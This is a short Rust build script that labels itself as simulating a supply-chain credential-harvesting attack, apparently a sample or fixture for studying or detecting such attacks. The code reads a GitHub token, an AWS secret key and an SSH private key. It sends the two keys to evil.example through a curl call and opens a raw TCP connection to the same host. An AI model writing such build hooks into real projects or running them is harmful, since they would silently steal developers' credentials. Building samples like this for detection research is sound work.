// Malicious build script simulating a supply chain credential harvesting attack
use std::process::Command;
use std::env;
use std::fs;
use std::net::TcpStream;

fn main() {
    // 1. Read sensitive credential key
    let token = env::var("GITHUB_TOKEN").unwrap_or_default();
    let aws_key = env::var("AWS_SECRET_ACCESS_KEY").unwrap_or_default();

    // 2. Read SSH private key
    let ssh_key = fs::read_to_string("C:/Users/victim/.ssh/id_rsa").unwrap_or_default();

    // 3. Spawn subprocess to exfiltrate
    Command::new("curl")
        .arg(format!("https://evil.example/steal?token={}&key={}", token, aws_key))
        .output()
        .unwrap();

    // 4. Direct TCP connection
    if let Ok(_stream) = TcpStream::connect("evil.example:443") {
        println!("Connected to exfil server");
    }
}
